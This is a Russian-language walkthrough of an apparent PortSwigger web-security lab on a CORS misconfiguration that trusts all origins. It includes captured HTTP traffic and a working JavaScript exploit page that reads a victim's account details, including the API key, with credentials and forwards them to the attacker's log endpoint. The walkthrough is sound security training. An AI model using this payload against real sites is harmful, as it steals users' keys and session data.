Этот веб-сайт имеет небезопасную конфигурацию CORS, поскольку он доверяет всем источникам.

Чтобы решить лабораторную работу, создайте JavaScript, который использует CORS для получения ключа API администратора и загрузки кода на ваш сервер эксплойтов. Лабораторная работа будет решена, когда вы успешно отправите ключ API администратора.

Вы можете войти в свою учетную запись, используя следующие учетные данные:`wiener:peter`

## Дано

- доверяет всем источникам.
- создайте JavaScript, который использует CORS для получения ключа API администратора
- учетные данные:`wiener:peter`

## Задача

- получить api ключ администратора

# Решение

1. В запросе
```
GET /accountDetails HTTP/2
Host: 0af3006a03fca143804d53e4009300d6.web-security-academy.net
Cookie: session=wCOxTS6EjZ4kuddboXi44rUWzcKQgWY2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0af3006a03fca143804d53e4009300d6.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=4
Te: trailers
```
Мы получаем ответ
```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "hjM1WcEfugRXpRQzIRF77FNhSJpKVxQz",
  "sessions": [
    "wCOxTS6EjZ4kuddboXi44rUWzcKQgWY2"
  ]
}
```
Access-Control-Allow-Credentials: true - указывает что куки будут отправлены

2. Добавляем Origin наш и тестируем
Ответ
```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://hosts.com
Access-Control-Allow-Credentials: true
```

3. На нашем сервере добавляем скрипт
```
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://domain-name.com"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```

- Создается объект `XMLHttpRequest`, который используется для выполнения HTTP-запросов на сервер.
```
var xhr = new XMLHttpRequest(); 
```

- Переменная `url` содержит адрес целевого сайта, к которому будет отправлен запрос.
```
var url = "https://0af3006a03fca143804d53e4009300d6.web-security-academy.net.com"
```

- Обработчик события `onreadystatechange`:
```
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("/log?key=" + xhr.responseText);
    }
};
```
- Устанавливается обработчик события `onreadystatechange`, который срабатывает при изменении состояния запроса (`readyState`).

- Когда запрос завершается (`readyState == XMLHttpRequest.DONE`), выполняется следующий код:
    - Данные, полученные от сервера (`xhr.responseText`), передаются на другой URL с помощью функции `fetch`.
    - В данном случае данные отправляются на `/log?key=`, где `key` — это параметр, содержащий ответ сервера.

- Отправка GET-запроса:
```
xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials = true;
xhr.send(null);
```

- Открывается GET-запрос к URL `https://0af3006a03fca143804d53e4009300d6.web-security-academy.net.com/accountDetails`.

- Параметр `withCredentials = true` указывает браузеру включить куки и другие учетные данные (если пользователь авторизован на целевом сайте) в запрос.

- Запрос отправляется с помощью `xhr.send(null)`.

